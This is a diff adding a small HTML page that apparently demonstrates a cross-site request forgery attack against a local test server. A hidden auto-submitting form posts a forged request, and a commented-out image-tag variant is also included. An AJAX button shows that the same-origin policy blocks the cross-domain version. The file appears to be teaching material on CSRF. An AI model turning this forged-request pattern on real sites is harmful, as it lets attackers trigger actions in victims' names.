@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>测试CSRF_attack</title>
+    <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+</head>
+<body>
+    <h1>测试CSRF_attack</h1>
+    <form id="danger_form" hidden method="post" action="http://localhost:3000/csrf_source">
+        <input name="book" id="book" value=20 />
+    </form>
+    <button id="btn">诱导或自动提交</button>
+    <button id="asyncBtn">测试异步提交（如果处于不同域，由于同源策略，攻击无效）</button>
+    <!-- <img src="http://localhost:3000/csrf_source?book=20" /> -->
+    <script>
+        $('#btn').on('click', e => {
+            $('#danger_form').submit();
+        });
+        $('#asyncBtn').on('click', e => {
+            $.ajax({
+                url: 'http://localhost:3000/csrf_source',
+                type: 'post',
+                contentType: 'application/json',
+                data: JSON.stringify({
+                    book: $('#book').val()
+                }),
+                success(res) {
+                    console.log(res)
+                }
+            });
+        });
+    </script>
+</body>
+</html>
